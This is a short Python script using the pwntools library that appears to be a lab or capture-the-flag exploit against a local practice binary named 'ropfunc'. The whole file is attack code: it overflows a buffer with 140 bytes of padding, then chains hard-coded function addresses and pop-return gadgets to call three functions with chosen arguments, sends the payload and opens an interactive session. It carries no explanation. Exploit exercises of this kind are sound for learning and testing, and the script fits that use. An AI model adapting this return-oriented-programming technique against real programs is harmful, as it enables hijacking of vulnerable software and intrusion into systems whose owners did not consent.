#!/usr/bin/python
from pwn import *

functionCall1 = 0x804845b
functionCall2 = 0x804847d
functionCallExit = 0x804844b
pr = 0x080482e9
ppr = 0x0804855a

s = process("./ropfunc")
pause()

payload = "A"*140

# call_1(param1 = 0xdeadc0de)
payload += p32(functionCall1)
payload += p32(pr)
payload += p32(0xdeadc0de)

# call_2(param1 = 0xbeefc475, param2 = 0x10101010)
payload += p32(functionCall2)
payload += p32(ppr)
payload += p32(0xbeefc475)
payload += p32(0x10101010)

# call_exit()
payload += p32(functionCallExit)
payload += "AAAA"

s.sendline(payload)

s.interactive()